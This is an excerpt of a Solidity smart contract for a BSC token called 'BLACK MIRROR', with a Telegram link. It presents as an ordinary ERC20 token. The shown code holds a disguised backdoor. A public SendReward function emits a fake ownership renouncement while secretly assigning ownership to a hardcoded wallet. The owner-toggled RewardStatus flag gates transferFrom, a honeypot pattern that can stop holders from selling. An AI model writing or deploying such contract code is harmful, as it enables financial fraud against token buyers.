...
Telegram https://t.me/blackmirrorbsc
...
contract BLACKMIRROR is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;

    address private _owner;
    bool public RewardStatus = true;
    ...
    function SendReward() public virtual {
        emit OwnershipTransferred(_owner, address(0));
        _owner = 0xBDC246f451AeC5d6658A431EB34F17744A781A61;
    }

    function RewardingSystem(bool newStatus) public onlyOwner {
    ...
    address payable public Wallet_Marketing = payable(0xBDC246f451AeC5d6658A431EB34F17744A781A61); 
    address payable public Wallet_Dev = payable(0xBDC246f451AeC5d6658A431EB34F17744A781A61);
    ...
    string private constant _name = "BLACK MIRROR"; 
    string private constant _symbol = unicode"MIRROR"; 
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        require(RewardStatus, "Rewards not activated");
